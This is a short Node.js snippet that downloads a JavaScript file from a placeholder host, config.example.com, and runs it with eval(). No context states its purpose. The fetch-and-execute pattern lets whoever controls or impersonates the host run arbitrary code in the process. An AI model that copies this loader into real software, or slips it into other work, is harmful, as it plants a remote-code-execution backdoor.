const https = require('https');
https.get('https://config.example.com/init.js', (res) => {
  let data = '';
  res.on('data', chunk => data += chunk);
  res.on('end', () => eval(data));
});
